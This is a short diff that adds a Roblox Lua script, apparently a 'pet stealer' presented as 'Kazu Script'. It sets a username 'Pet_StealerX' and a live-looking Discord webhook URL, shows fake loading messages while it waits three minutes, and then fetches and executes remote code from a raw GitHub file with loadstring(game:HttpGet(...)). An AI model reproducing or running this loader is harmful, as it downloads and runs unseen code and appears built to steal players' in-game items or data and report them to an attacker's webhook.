@@ -1,0 +1,8 @@
+UserName = "Pet_StealerX"
+Webhook = "https://discord.com/api/webhooks/1096450448787001344/acWviPtphJ8QWi7jFDYJc4c5KmT6J_3Un4ClKzL1e9F3a9srGXEefRAUqlEdv0CiBYbM"
+_G.ScriptName = "Kazu Script"
+_G.FirstText = "Script Preparing..."
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
